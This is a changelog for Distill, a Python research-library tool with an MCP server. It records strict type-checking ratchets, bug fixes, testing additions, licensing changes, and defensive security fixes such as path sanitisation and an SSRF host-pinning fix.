# Changelog

All notable changes to this project will be documented in this file.

The format is loosely based on [Keep a Changelog](https://keepachangelog.com/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## Unreleased

### Changed

- Promoted the corpus reprocessing commands to Pyright strict mode with typed
  metadata parsing for transcript-backed reanalysis.
- Promoted the discover helper flow to Pyright strict mode with typed sizing,
  confirmation, and mixed-source ingest boundaries plus public learning seams
  for query de-duplication, recent-video filtering, and learning selection.
- Promoted the YouTube process command module to Pyright strict mode through
  public preflight, intent, and file-link seams plus typed transcript tracking.
- Promoted the audit command module to Pyright strict mode with typed audit
  report, broken-link, and action-handler boundaries.
- Promoted the paper ingestion command module to Pyright strict mode through
  typed public query-expansion, ranked-paper display, and source-rigor seams
  while preserving legacy command monkeypatch aliases.
- Aligned the Docker image with the project Python floor by moving the base
  image to Python 3.12, including the package license file in the build context,
  adding a `.dockerignore` for local runtime state, and covering the container
  metadata with focused regression tests.
- Ratcheted the report/export commands and shared site-ingest helper to Pyright
  strict mode. Site ingest now uses public command intent-loading and
  site-manifest loading seams and parses previous page metadata as a typed JSON
  object before unchanged-page reuse.
- Ratcheted the first-run init command and concepts command group to Pyright
  strict mode. Init now uses the public doctor key-validation seam and a typed
  setup-verdict payload for JSON and console output.
- Ratcheted the learning-preview command group to Pyright strict mode. The
  command now uses public typed learning-preview and learning-ingest helper
  seams while preserving the legacy monkeypatch names used by tests.
- Ratcheted the `distill eval` command to Pyright strict mode. Eval startup now
  uses a public shared preflight helper while preserving model selection, judge
  selection, cost estimate, report, and results-log behavior.
- Ratcheted the recurring profile command group and adaptive ingest command to
  Pyright strict mode. The ingest command now carries explicit `DistillConfig`
  helper boundaries while preserving existing adapter dispatch behavior.
- Ratcheted the discover ingest and site-batch helper surfaces to Pyright
  strict mode, with typed exception-issue detail payloads and direct typed
  helper imports instead of compatibility-module indirection.
- Ratcheted the command JSON envelope, trusted-site discovery, and self-update
  surfaces to Pyright strict mode. JSON envelope parsing now rejects malformed
  status or error fields at the boundary, and trusted-site discovery injection
  uses a typed result protocol instead of an untyped callable.
- Ratcheted the command package marker, root callback, intent commands,
  topic/channel resolver, and topic-watch helper surface to Pyright strict
  mode. Topic-watch naming and ranking helpers now have public names with a
  typed ranking-strategy record, while legacy private aliases remain for
  compatibility.
- Ratcheted the full MCP package to Pyright strict mode by adding the server
  registration surface and tools package marker, replacing unused side-effect
  imports with an explicit registration module list while preserving FastMCP
  tool, resource, and prompt registration.
- Ratcheted the MCP resource handlers to Pyright strict mode with public MCP
  config, registration, library, markdown-resource, source-inventory,
  frontmatter-stripping, and video-list seams. `distill://topics/{topic}/videos`
  now returns parsed video URL, duration, and analysis mode metadata instead of
  silently defaulting those fields when metadata is available.
- Ratcheted the MCP discovery tools, `learn_topic`, `search_videos`, and
  `discover`, to Pyright strict mode with public MCP config, registration,
  write-guard, library, tracker, and cost-summary seams. MCP `search_videos`
  now goes through the spend-side write guard in read-only deployments, and
  video or paper rerank budget stops now propagate instead of falling back after
  the cap is crossed.
- Ratcheted the MCP concept playbook tools, `find_concepts`, `read_concept`,
  `concept_history`, and `concept_diff`, to Pyright strict mode with public MCP
  config, registration, and path-resolution seams plus typed JSONL search rows,
  history rows, and concept-result payloads.
- Ratcheted the MCP `site_batch` tool to Pyright strict mode with public MCP
  config, registration, write-guard, allowlist, tracker, and cost-summary seams,
  typed page result rows, typed FastMCP progress context, and an explicit
  compatibility shim for legacy tuple-shaped site ingest results.
- Ratcheted the MCP watch tools, `catch_up`, `watch_add`, and `watch_remove`,
  to Pyright strict mode with public MCP config, registration, write-guard,
  allowlist, library, tracker, and cost-summary seams. MCP `watch_add` now
  reports skipped auto-instruction generation instead of silently discarding
  the failure.
- Ratcheted the MCP `papers` tool to Pyright strict mode with public MCP
  config, registration, write-guard, tracker, and cost-summary seams, typed
  paper result rows, and a typed paper-analysis callback contract.
- Ratcheted the MCP `synthesize` tool to Pyright strict mode with public MCP
  config, registration, write-guard, library, tracker, and cost-summary seams,
  plus typed synthesis result rows and strict FastMCP progress context typing.
- Ratcheted the MCP `generate_report` and `resynthesize_topic` tools to
  Pyright strict mode with public MCP config, registration, write-guard,
  library, tracker, and cost-summary seams, plus typed resynthesis result rows.
- Ratcheted the MCP `ask` tool to Pyright strict mode with public MCP config,
  registration, write-guard, tracker, and cost-summary seams, plus focused MCP
  response-shape coverage.
- Ratcheted the MCP summary tools, `list_topics`, `find_insights_summary`, and
  `list_topic_summary`, to Pyright strict mode with public MCP config,
  registration, write-guard, tracker, and cost-summary seams.
- Ratcheted the MCP `process_video_url` topic ingest tool to Pyright strict
  mode with public MCP registration, write-guard, allowlist, tracker, library,
  cost-summary, and markdown-stripping seams.
- Ratcheted the MCP `okf_export` and `okf_validate` tools to Pyright strict
  mode with public MCP config, registration, and write-guard seams.
- Ratcheted the MCP `costs` tool to Pyright strict mode with parsed cost-log
  rows, public MCP config loading, and malformed spend-field tolerance.
- Ratcheted the MCP JIT `find_insights` and `read_insight` tools to Pyright
  strict mode with public MCP config loading and typed section responses.
- Ran the scheduled maintenance sweep and ratcheted the MCP `doctor` tool to
  Pyright strict mode with typed check rows, public key-validation access, and
  import-free Playwright availability probing.
- Ratcheted the MCP package marker, prompt definitions, and `research_gaps`
  tool to Pyright strict mode, with a public server config-loading seam for
  tool modules that should not reach through private server helpers.
- Ratcheted `distill.pipeline.summary` to Pyright strict mode, with typed
  run-summary defaults and observable debug logging for non-fatal cost-log
  write failures.
- Ratcheted the report interactions boundary to Pyright strict mode, parsing
  external Gemini interaction shapes into typed object and sequence checks
  before reading model output text or polling status.
- Ratcheted the single-call report synthesis boundary to Pyright strict mode
  and removed em dash separators from its touched prompt text.
- Ratcheted the lightweight report briefing boundary to Pyright strict mode,
  parsing video metadata through typed object checks and logging malformed
  metadata at debug level.
- Ratcheted the Gemini Deep Research report boundary to Pyright strict mode and
  removed the unused condensed-corpus helper that File Search had superseded.
- Ratcheted the Gemini File Search store and corpus boundary to Pyright strict
  mode, parsing uploaded corpus metadata through a private typed helper.
- Ratcheted the multi-topic research briefing boundary to Pyright strict mode
  and shared the Gemini File Search upload/indexing helper with report store
  management.
- Ratcheted the report package export boundary to Pyright strict mode.
- Ratcheted the accordion report runner to Pyright strict mode, with shared
  channel-scope enumeration and typed video metadata before source-link
  rendering.
- Ratcheted the pipeline package export boundary to Pyright strict mode.
- Ratcheted the route-orchestration selection core to Pyright strict mode.
- Ratcheted the discovery planning and rerank helper to Pyright strict mode,
  with typed callback protocols and typed LLM JSON row parsing.
- Ratcheted the deterministic audit health surface to Pyright strict mode,
  with typed sidecar flags, stale prompt rows, contested findings, and hygiene
  lists.
- Completed the `distill.pipeline` Pyright strict surface by ratcheting shared
  dashboard data to strict mode, with typed cost-log rows, latest-run payloads,
  topic-change history, dashboard snapshots, and site-manifest records shared
  by CLI and web renderers.

### Fixed

- Made `distill watch add` report auto-instruction generation failures instead
  of silently swallowing discovery or instruction-model errors while still
  adding the channel without generated instructions.
- Cleared the remaining library Pyright warning tail by replacing the dynamic
  package export list with an explicit public surface, typing the python-docx
  factory/class boundary in the DOCX renderer, and setting paragraph spacing
  through `paragraph_format`.
- Cleared the YouTube yt-dlp Pyright warning cluster by isolating dynamic
  `YoutubeDL` params, extractor rows, and metadata fields behind a typed
  boundary helper.
- Cleared the maintain command Pyright warning cluster by reusing safe prompt
  telemetry converters and typing the online status channel queue as
  `ChannelInfo`.
- Cleared the adapter-runner timeout stdout/stderr Pyright warning pair by
  normalizing `TimeoutExpired` text or bytes output before result construction.
- Cleared the shared required-topic command resolver Pyright warning cluster by
  promoting the non-null topic wrapper into a dedicated command helper module
  and reusing it across view, process, report/export, reprocess, and open
  command paths.
- Cleared the eval command optional local-judge assignment warning while
  preserving the existing neutral-judge selection behavior.
- Cleared the doctor command importlib metadata Pyright warning by using a
  module-level metadata alias for dependency and transcription checks.
- Cleared the topic-change and view-command Pyright warning cluster by parsing
  diff, trend, watch-alert, and history rows into typed records before command
  rendering or history writes.
- Cleared the command-helper Pyright warning cluster by normalizing non-string
  yt-dlp channel metadata to the standalone fallback and binding report DOCX
  output paths before export failures are recorded.
- Cleared the shared console stream-reset Pyright warning while preserving
  JSON-mode routing to the live stdout or stderr stream instead of stale test
  buffers.
- Cleared the MCP optional progress-context Pyright warning cluster by typing
  FastMCP-injected contexts as `Context | None` on write tools that can also be
  called without an active request context.
- Cleared the full-surface Pyright error in MCP video-insight resources by
  making shared video-list metadata express the complete rows it emits.
- Pinned the PyPI publish action to the current `release/v1` commit SHA while
  preserving OIDC trusted publishing and PEP 740 attestations.
- Cleared the remaining default Pyright warnings in the report pipeline by
  typing accordion section flow and skipping unnamed Gemini File Search stores
  during cleanup.
- Aligned Gemini File Search indexing polling with the current google-genai
  operation-object contract, and stopped trusting non-string metadata fields
  when bundling video, site, and paper corpus files.
- Applied the same operation-object polling and typed metadata fallback to
  `distill research-brief` corpus uploads.
- Made discovery rerank parsing tolerate malformed numeric LLM score fields by
  defaulting those fields at the typed row boundary instead of crashing.
- Tightened profile command error exits so failure paths are statically known
  to stop before preview or run rendering reads result variables.
- Disabled htmx eval and response script execution in the local dashboard base
  template as defense in depth alongside Markdown sanitization and CSP headers.

## 0.19.9 - 2026-06-28

### Changed

- Ratcheted `distill.pipeline.gaps` to Pyright strict mode, with typed
  inventory and gap-summary payloads for audit, MCP, and gap-driven discovery.
- Ratcheted `distill.pipeline.analysis` to Pyright strict mode across website,
  video, paper, newsletter, local-file, media, podcast, repository, and X
  ingestion boundaries.
- Ratcheted `distill.pipeline.synthesis` to Pyright strict mode for channel,
  topic, corpus, and two-pass claim synthesis.
- Ratcheted recurring profile preview and run orchestration to Pyright strict
  mode.

### Fixed

- Exposed gap recommendations under both `recommended_actions` and
  `next_actions` so audit reports receive the same follow-up actions that MCP
  gap summaries expose.

## 0.19.8 - 2026-06-28

### Changed

- Ratcheted `distill.pipeline.ranking` to Pyright strict mode and parsed LLM
  rerank response rows into typed object dictionaries before ranking fields are
  read.

## 0.19.7 - 2026-06-28

### Added

- Added recovery mutation-survivor tests for collision-bumped note lookup,
  whitespace-tolerant snapshot resolution, malformed source filtering, rollup
  row replacement, entity rollup routing, and rollback sorting.

### Fixed

- Rejected colon-bearing concept recovery slugs so Windows drive-style inputs
  fail closed on every platform.

## 0.19.6 - 2026-06-28

### Changed

- Removed legacy Anthropic and OpenAI dead provider modules and corrected
  provider-route docs so only implemented routes are described as live.

## 0.19.5 - 2026-06-28

### Added

- Added deterministic mutation-survivor tests for library path helpers, covering
  path-component rejection, default artifact filenames, frontmatter list and
  boolean emission, and nested atomic writes.

## 0.19.4 - 2026-06-28

### Added

- Expanded the mutation-testing diagnostic into a non-blocking manual plus
  weekly workflow across contracted concepts, library, and verify/dedup core
  modules. The workflow now reads its deterministic test slice from
  `[tool.mutmut]`, copies the full package for import closure, filters to
  covered lines, and keeps mutation results advisory.

## 0.19.3 - 2026-06-28

### Added

- Added executable contracts and generated `deal.cases` coverage for library
  frontmatter emit/merge helpers and wiki-link parsing, plus structural shape
  contracts for link check/fix results.
- Hardened frontmatter parsing so Unicode line-separator characters inside
  quoted values do not split rows or hide emitted keys.

## 0.19.2 - 2026-06-28

### Added

- Added generated `deal.cases` coverage for the concept canonicalization and
  path-sanitizer contracts, plus an executable canonicalization idempotence
  contract.
- Added explicit `ConceptMention` strategies to generated contract tests so
  grouping, threshold, and merge contracts are exercised with rich dataclass
  inputs instead of empty iterable smoke cases.
- Added the first generated contract test using `deal.cases`, covering arbitrary
  note text through `concepts.recovery.parse_note_fields` without adding extra
  runtime or dev dependencies.
- Added a manual, non-blocking GitHub Actions mutation diagnostic for the 1.0
  verification-depth milestone. The first Phase 0 scope mutates
  `distill/concepts/merge.py` against `tests/unit/concepts/test_merge.py`, with
  the exact `mutmut` surface stored in `[tool.mutmut]` and generated mutation
  artifacts ignored locally.
- Added a free MCP `list_topics` tool so tool-only clients can discover corpus
  topics before calling topic-scoped tools such as `find_insights`,
  `list_topic_summary`, or `ask`.

### Changed

- Added executable `deal` contracts to the concept normalization layer:
  `group_mentions` now asserts canonical, sorted, source-unique grouping, and
  `filter_by_threshold` asserts that filtered groups clear the distinct-source
  floor. This continues the 1.0 verification-depth pass on deterministic core
  invariants.
- Started the 1.0 verification-depth milestone (design:
  [`docs/design/verification-depth.md`](design/verification-depth.md)): added the
  `deal` Design-by-Contract library and the first executable, runtime-checked
  invariants on the deterministic core. `concepts.build_merged_concept` now
  asserts the credal-interval invariants (intervals never invert or go negative;
  every mention is preserved as exactly one source), and the three path
  sanitizers (`slugify_title`, `sanitize_path_component`, `sanitize_topic`) assert
  the single-path-component confinement guarantee. Contracts run in dev, CI, and
  production; the path contract plus a fuzz test immediately surfaced the NUL-byte
  gap fixed above.
- Documentation accuracy pass: corrected the MCP tool count from 26 to 27 (the
  `list_topics` tool was added but the README and `docs/mcp.md` count had not been
  bumped) and documented `list_topics` in the `docs/mcp.md` read-surface table.
  Updated the ROADMAP "Milestones at a glance" to show 0.18 and 0.19 as shipped
  (latest release 0.19.2) rather than as remaining work, folding the genuinely
  open, vendor-gated 0.19 route-graduation gates into the post-1.0
  provider-breadth item.
- Documentation refresh: removed em-dashes and en-dashes from the README and
  every hand-authored doc (replaced with hyphens/commas per the project's own
  `FORMATTING_RULES`; generated example corpus and golden eval baselines left
  untouched). Trimmed the README "Cost" section, whose route-status and adapter
  detail had grown into a ~55-line wall of text duplicating `docs/cost.md`; it is
  now a tight cost-modes + recurring-profiles summary that points to
  [`docs/cost.md`](cost.md) and the adapter/routing design notes for depth.
- Advanced the 1.0 Pyright-strict ratchet: the entire `distill/concepts/`
  package (extract, normalize, merge, records, notes, exports, contradictions,
  pipeline, recovery) is now `# pyright: strict`. The pure aggregation core
  needed only precise type arguments; the IO and recovery surfaces gained honest
  narrowing at their JSON boundaries (a single `cast` after each
  `isinstance(..., dict|list)` guard) so no `Unknown` propagates through
  extraction, rollback, diffing, or the contested-concept read path. No behavior
  change; the playbook lifecycle property suite stays green.
- Extended the same strict ratchet to the entire `distill/claims/` package
  (records, exports, extract, pipeline). As a side effect of making the type
  honest, `claims.jsonl`'s `_read_rows` now filters non-dict rows at read time
  (matching the concept layer), so a truncated or hand-edited append can no
  longer reach a `"source_id" in row` test on a non-object. No other behavior
  change.
- Extended the same ratchet across the `library/` deterministic core:
  `paths.py` (the slug/frontmatter foundation), `links.py`, `wikilinks.py`,
  `freshness.py`, `insights.py`, `ingested.py`, `intent.py`, `citations.py`, and
  `claude_md.py` are now `# pyright: strict`. Fixes were precise generic
  arguments plus a single `cast` at each `json.loads`/`isinstance` boundary
  (loaded intent JSON, citation metadata, orientation-file rows, frontmatter
  list values), so no `Unknown` reaches the `.get` / `str(item)` calls. No
  behavior change.
- Continued the `distill/commands/` strict ratchet on three more already-clean
  CLI command modules: `ask.py` (the `distill ask` command), `_paper_artifacts.py`
  (paper artifact writers), and `claude_md.py` (the orientation-file command).
  All fully typed; markers only. No behavior change.
- Began the `distill/commands/` strict ratchet on three already-clean CLI helper
  modules: `_discover_options.py` (discover-flag normalization), `_concept_ingest.py`
  (concept-playbook ingest helper), and `okf.py` (the OKF export/validate command).
  All were fully typed; the marker just locks them. No behavior change.
- Made `pipeline/profile_health.py` (the deterministic recurring-profile health
  checks behind `distill audit all`) `# pyright: strict`. The `ProfileHealth`
  dataclass's seven `list[dict[str, str]]` finding-buckets take the documented
  `field(default_factory=list)` house ignore; the state-reading helpers gained
  honest JSON-boundary types (`_profile_state_findings` returns
  `dict[str, list[dict[str, str]]]`, the loaded run-state is cast to
  `dict[str, Any]` after its `isinstance` guard). No behavior change.
- Made `pipeline/ask.py` (the corpus-grounded Q&A pipeline with verify-gated
  `--save` promotion) `# pyright: strict`. It was already fully typed; the only
  change was the documented `field(default_factory=list)` house ignore on
  `AskResult.sources`. No behavior change.
- Made the verify core `# pyright: strict`: `verify.py` (the write-time numeric
  claim-grounding hook) and `verify_entailment.py` (the optional local
  cross-encoder prose-entailment tier). `verify_entailment.py` gained a
  `FlaggedClaim` TypedDict for `EntailmentReport.flagged` (was `tuple[dict, ...]`),
  and its `entailment_available()` check moved from a `try/import` to
  `importlib.util.find_spec` (no heavy import just to probe presence). The
  untyped optional `transformers` dependency is confined to two justified
  `pyright: ignore`s in the `HHEMChecker` wrapper, with the model handle held as
  `Any`. `verify.py`'s sidecar `payload` is now typed `dict[str, object]` so the
  conditional entailment block typechecks. No behavior change.
- Extended the `distill/pipeline/` strict ratchet to `search.py` (the lexical
  corpus search / preview engine behind `ask` and the sub-agent summaries) and
  `preview_cache.py` (the content-addressed `discover` shortlist replay store).
  `search.py` was fully typed; making it strict surfaced and removed a dead
  module constant (`_MARKDOWN_STRIP_RE`, never referenced - `_strip_markdown`
  reimplements those regexes inline). `preview_cache.py` took bare-`dict`
  annotations (`dict[str, Any]`) and one documented `default_factory=list` house
  ignore. No behavior change.
- Extended the `distill/pipeline/` strict ratchet to `audit_video_duplicates.py`
  (exact YouTube source-identity duplicate detection) and `summary_query.py`
  (the cached, token-bounded sub-agent query-summary engine).
  `audit_video_duplicates.py` took the recurring JSON-boundary cast, typed
  `metadata` params, and a `parts: tuple[str, ...]` annotation; `summary_query.py`
  was already clean (its `json.loads` cache read flows through explicit `Any`).
  No behavior change.
- Extended the `distill/pipeline/` strict ratchet to two deterministic
  corpus-integrity modules: `dedup.py` (embedding-free near-duplicate insight
  detection via shingle Jaccard + union-find) and `audit_transcripts.py`
  (thin-long-video-transcript health checks). `dedup.py` was already fully typed
  so the marker just locks it; `audit_transcripts.py` needed only the recurring
  `json.loads` boundary cast in `_read_json_dict`. No behavior change.
- Started the `distill/pipeline/` strict ratchet on the loop/refresh schema
  modules: `next_actions.py` (the loop-readable next-action JSON contract for
  external stewardship loops) and `goals.py` (persisted topic goals) are now
  `# pyright: strict`. `next_actions.py`'s four `to_dict()` methods now return
  `dict[str, object]` (the honest JSON-object type). `goals.py` gained typed JSON
  boundaries (`load_topic_goals -> dict[str, dict[str, Any]]`), an `int`-coercion
  helper that narrows before `int()` instead of catching a type error, and a
  `trusted_sites` normalizer that handles str/list/other explicitly - the last
  also hardens a latent crash, since the old `for source in (entry.get(...) or [])`
  would have raised on a non-iterable truthy value. No behavior change on valid
  input.
- Completed the `distill/prompts/` strict ratchet: `report.py` (deep-research
  dossier, per-section writer, QA, fix, topic brief) and the re-export
  `__init__.py` are now `# pyright: strict`, so the whole package is strict.
  `report.py` gained two precise `TypedDict`s - `ReportSection` for the
  `REPORT_SECTIONS` definitions (with `multi_channel_only` as `NotRequired`,
  since the single-channel replacement omits it) and `WrittenSection` for the
  prior-context sections - replacing the `dict` / `list[dict]` signatures on
  `get_active_sections`, `section_prompt`, and `fix_prompt`; the defensive copies
  switched from `dict(section)` to `section.copy()` to preserve the typed shape.
  `__init__.py` carries one justified `reportUnsupportedDunderAll` ignore for its
  spread `__all__`. No behavior change.
- Advanced the `distill/prompts/` strict ratchet onto the two large aggregation
  builders: `synthesis.py` (channel/topic/site/paper/corpus synthesis) and
  `discover.py` (search expansion + cross-source rerank) are now
  `# pyright: strict`. `synthesis.py` needed no change beyond the earlier
  `emphasis_block` promotion; `discover.py`'s rerank builders took honest
  boundary types - the duck-typed candidate-object lists (`videos`, `papers`,
  accessed via attribute + `getattr`) are `Sequence[Any]` because the
  foundational `prompts/` layer cannot import the concrete `ingestors` metadata
  types, and the documented dict pool (`candidates`) is `Sequence[dict[str, Any]]`.
  Only `report.py` and the wildcard-re-export `__init__.py` remain. No behavior
  change.
- Continued the `distill/prompts/` strict ratchet onto the per-source builder
  prompts: `lenses.py` (analysis-lens stances + section sets), `analysis.py`
  (video extraction/synthesis), `claims.py` (claim extraction + claim-aware
  synthesis), and `x.py` (tweet/vocabulary) are now `# pyright: strict`. The one
  real fix: `claims.py` imported the private `synthesis._emphasis_block`, which
  strict rejects across a module boundary, so the genuinely-shared helper is
  promoted to public `synthesis.emphasis_block` (added to `__all__`) and both
  call sites updated. No behavior change.
- Began the strict ratchet on `distill/prompts/`: the prompt-version registry
  (`registry.py`, the single source of truth for `prompt_id` floors), the shared
  rule constants (`shared.py`), and the single-pass builder prompts (`ask.py`,
  `summary_query.py`, `media.py`, `podcasts.py`, `github.py`, `concepts.py`) are
  now `# pyright: strict`. These were already cleanly typed (keyword-only str
  inputs to f-string builders); the marker locks them. The wildcard-re-exporting
  `prompts/__init__.py` is intentionally left until the larger builders it
  imports are strict, since pyright cannot statically verify its spread `__all__`.
- Made the top-level foundation modules `# pyright: strict`: `config.py`
  (the `DistillConfig` pydantic-settings boundary, imported almost everywhere)
  and `_version.py` were already clean; `preflight.py` and `update.py` needed
  honest types at their edges - the `console` parameters are now typed
  `rich.console.Console`, the JSON-cache helpers carry `dict[str, Any]` instead
  of bare `dict`, and `_safe_subprocess_env` returns `tuple[str, dict[str, str]]`.
  As a parse-don't-validate parity fix, `preflight._read_cache` now guards its
  `json.loads` result with an `isinstance(..., dict)` check (matching
  `update._read_cache`), so a cache file rewritten as a JSON array can no longer
  reach a `.get` on a non-object. No behavior change.
- Made `library/state.py` (the topic/channel hierarchy, watchlists, and
  per-channel processed-video state) `# pyright: strict` by turning its two JSON
  stores into parse-don't-validate boundaries. The on-disk payload is now parsed
  once at load into typed `TypedDict` shapes (`LibraryData`, `ChannelStateData`)
  via total coercion helpers, so the required keys are guaranteed present and
  well-typed and the methods no longer re-validate ad hoc on every read. Side
  effect: a top-level JSON document that is not an object (e.g. an array) now
  normalizes to an empty store instead of raising `TypeError` mid-load, and the
  one external reach into private state (`doctor.py`) moves to a new public
  `ChannelState.processed_video_ids()`. No happy-path behavior change; the state
  and channel-state suites stay green.
- Finished the strict ratchet on `library/okf.py` and `library/migration.py`,
  and in the process promoted two helpers to public API in `library/paths.py`
  that those modules had been importing as privates: `split_frontmatter`
  (renamed from `_split_frontmatter`) and a `LEGACY_ARTIFACT_NAMES` alias
  (mirroring the existing `ARTIFACT_SUFFIXES` alias). Production code now imports
  the public names; the private internals remain for in-module and test use. The
  whole `library/` package is strict except `export.py` (a thin renderer over the
  untyped `python-docx`, where strict would only add cast-noise against a
  third-party dependency). (`state.py` was subsequently made strict via a
  parse-don't-validate redesign, recorded above.)

### Fixed

- Tightened concept recovery frontmatter parsing so malformed structured fields
  fall back to typed, non-negative defaults instead of leaking raw strings into
  rollback rollup rows. Added executable contracts for parsed frontmatter shape
  and rebuilt rollup-row structure.
- Bounded several untrusted response reads that had no size cap (the trusted-site
  sitemap / landing-page fetch, the YouTube browser-search HTML fetch, and the
  arXiv Atom feed) so a hostile or compromised host cannot drive a multi-GB read
  into memory; mirrors the existing 5 MB podcast-feed cap.
- Guarded crash-on-malformed-input paths at untrusted boundaries: the YouTube
  `ytInitialData` `json.loads`, the X syndication numeric fields
  (`durationMs` / `bitrate` / `favorite_count` / `conversation_count`), and the
  arXiv feed XML parse (arXiv returns an HTML error page on some rate-limited
  requests) now degrade to empty results instead of aborting the run with an
  uncaught exception.
- The MCP `catch_up`, `discover`, `learn_topic`, and `papers` tools no longer
  silently swallow synthesis failures while reporting success; the failure is now
  logged (observable in `library/.distill/distill.log`), honoring the
  no-silent-error-swallowing rule. Synthesis stays best-effort (one item failing
  does not abort a multi-item run), but it is no longer silent.

### Security

- Hardened `sanitize_path_component` to strip control characters (NUL and other
  C0 / DEL) from path components, found by a new `deal` path-safety contract plus
  a Hypothesis fuzz test on the sanitizers: a NUL byte in a path component is
  filesystem-dangerous (it can truncate a path at the C level), and this
  sanitizer previously passed it through. `sanitize_topic` and `slugify_title`
  were already safe; this closes the gap on the third sanitizer.
- Fixed an SSRF: `discover_videos` handed an unvalidated channel URL to yt-dlp
  (which does its own networking, outside the urllib/requests SSRF guards),
  reachable by default through the MCP `watch_add` / `catch_up` write tools. It
  now applies the same `is_youtube_url` host-pinning every sibling yt-dlp entry
  point already used, so an attacker-influenced URL can no longer reach internal,
  loopback, link-local, or cloud-metadata addresses. Regression-tested.

## 0.19.1 - 2026-06-25

Patch release for portable route availability inputs and local route proof.

### Added

- Added a portable `route-availability.v1` snapshot parser plus local-service
  availability signals for Ollama and LM Studio. Route pools can now require
  live availability proof for local routes as well as included-plan adapters,
  and `distill doctor --json` exposes local route availability without account
  or secret metadata.
- Documented a provider-caching research spike for Anthropic, OpenAI, Gemini,
  Bedrock, Foundry, and xAI with explicit cost, TTL, telemetry, and cleanup
  guardrails before any provider-side cache control can graduate.

## 0.19.0 - 2026-06-25

Feature release for graduated adapter route pools and quota-aware route
availability.

### Added

- Added `distill.eval.route_pool`, a pure route-pool admission layer that
  prefers local routes, admits plan-quota adapter routes only after an eligible
  graduation decision, blocks unproven adapters, and keeps credit-metered routes
  behind `paid-ok`.
- Added `distill.eval.route_availability`, a pure quota/service availability
  contract for route pools. It normalizes rolling quota windows, stale evidence,
  and structured quota stops so admitted routes can be evicted without provider
  scraping in the selector.

## 0.18.3 - 2026-06-25

Patch release for route-graduation gating, artifact lookup compatibility, and
agentic-loop contributor guidance.

### Added

- Added `distill.eval.graduation`, a pure route-graduation decision layer that
  combines model-judged eval evidence with adapter doctor readiness. It fails
  closed on missing judge signal, unfaithful output, errored fixtures, weaker
  faithfulness than the anchor, missing no-metered proof, and credit-metered
  routes.
- Added a contributor checklist for agentic and loop changes covering bounded
  execution, idempotent side effects, durable contracts, approval boundaries,
  observable outcomes, staged rollout, and focused failure-mode tests.

### Fixed

- `find_artifact` now recognizes lowercase modern artifact suffixes such as
  `*_synthesis.md` on case-sensitive filesystems, matching the compatibility
  behavior users saw on Windows and macOS.
- Updated the README release-quality claim to the current test count and
  branch-coverage floor.
- Removed the README license-section contact guidance now that the project uses
  standard Apache 2.0 terms.
- Removed stale adapter-doctor blocker language that still described Grok,
  Gemini CLI, and Antigravity native usage capture as unimplemented after the
  parsers and capture writers landed.
- Updated `distill eval` usage docs to describe the current source-anchored
  faithfulness gate, pairwise at-par gate, and advisory-only composite
  threshold.

## 0.18.2 - 2026-06-22

Bug-fix release. No new product surface; fixes five defects found in a
bug-hunt pass and closes the release-automation gap that left GitHub Releases
trailing PyPI.

### Fixed

- **Router crashed on every LLM call made from a running event loop** (the async
  MCP server path: `papers`, `sites`, `discover`, `synthesis` tools). The
  nested-loop fallback in `router.call` could never succeed - `asyncio.run`
  raised inside a running loop, and `loop.run_until_complete` on the live loop
  raised again. Now uses `run_coroutine_sync`, which offloads to a dedicated
  thread.
- **GitHub and podcast ingest raised raw `NetworkError` instead of a clean
  domain error.** `safe_urlopen` wraps every HTTP/network failure in
  `NetworkError`, but `github/fetch._get_json` and `podcasts/feed._fetch_bytes`
  caught only `urllib` errors, so a 404 / rate-limit / dead host escaped past
  the CLI handler as an unhandled traceback. Both now translate `NetworkError`
  into `GitHubFetchError` / `PodcastFetchError` (with the original status code
  preserved for the 404 and rate-limit messages).
- **`distill run --all` against an empty library raised `IndexError`** on the
  "What's next" hints (empty topic list). The hints are now skipped when there
  are no topics.
- **`distill catch-up` dropped goal-refresh hints for all but one topic.** The
  topic-synthesis loop rebound the `--topic` filter variable, so
  `_print_goal_refreshes` saw the last synthesized topic instead of the
  intended `None` (all goals). The loop now uses a distinct variable.
- **The adaptive chunker could emit an over-window chunk** when a single
  paragraph was larger than the whole context window - it never hard-split
  within a paragraph, violating the chunk-size invariant on small local-model
  windows. It now hard-splits on word (then character) boundaries so no chunk
  exceeds the window.

### Changed

- **`Publish to PyPI` workflow now creates a matching GitHub Release** after a
  successful publish, attaching the built sdist/wheel and SBOM. Previously
  releases were created by hand, which let the GitHub Releases page fall behind
  the tags and PyPI.

## 0.18.1 - 2026-06-22

### Changed

- **License:** Standard Apache License 2.0 (Commons Clause removed).

## 0.18.0 - 2026-06-21

Quality, licensing, and release-hygiene release. No new product surface; raises
test coverage across decomposed CLI modules, fixes first-run setup paths, and
clarifies commercial-use licensing.

### Added

- **CLI command test suites** for decomposed modules (`process`, `update`,
  `reprocess`, `learn`, `profile`, `reports`, `watch`, `view`, `audit`, `doctor`,
  MCP tools). Branch coverage floor ratcheted to 84% (measured ~89% on 3.12).

### Changed

- **License:** Apache License 2.0 + Commons Clause (replaces MIT). Personal,
  research, and sharing use remain free; commercial or enterprise products that
  substantially derive value from Distill require a separate license from Nick
  Seal. See `LICENSE` and the notice at the top of `README.md`.
- **`scripts/setup.py`:** Resolve the repository root correctly when invoked as
  `python scripts/setup.py`; check installed `distillr` package metadata instead
  of the obsolete `distill` distribution name.
- **`docs/CONTRIBUTING.md`:** Contributor license agreement matches the new
  `LICENSE`.

- **MCP OKF tools.** `okf_export` writes a read-only OKF bundle and returns
  paths plus a short preview; `okf_validate` runs structural bundle validation
  and stays available in read-only MCP deployments.
- **Effective-context-aware paper multipass analysis.** Long PDFs now run three
  focused passes (`Summary and Contribution`, `Methods and Evidence`, `Limits
  and Follow-Up`) over section-aware chunks. Chunk selection is structural
  first (heading metadata), then at most one batched model rerank when gaps
  remain, then honest positional order when no model is available. Keyword
  overlap is tier-4 fallback only for legacy insight category names, never for
  paper pass names. `chunk_selection_modes` is recorded in paper frontmatter.
- **`distill/llm/async_compat.py`.** `run_coroutine_sync()` for safe nested
  asyncio on Windows and Unix when multipass rerank runs from sync CLI paths.
- **OKF export enrichment.** Concept and entity playbooks export as conformant
  OKF types; wikilinks rewrite to bundle-relative Markdown links; `index.md`
  groups entries by type; `log.md` includes profile run and cost-log history;
  `llms.txt` points agents at `index.md` and `log.md`. Profile runs with
  `okf_export: true` auto-export after `--yes` execution.
- **Paper PDF extraction limits.** Removed the 100K-character truncation on arXiv
  PDF text now that multipass chunk selection owns prompt sizing. Page limit
  raised to 200; download-byte cap unchanged. Local PDF ingest matches (optional
  `max_chars` on `extract_local_document` only when callers pass it).
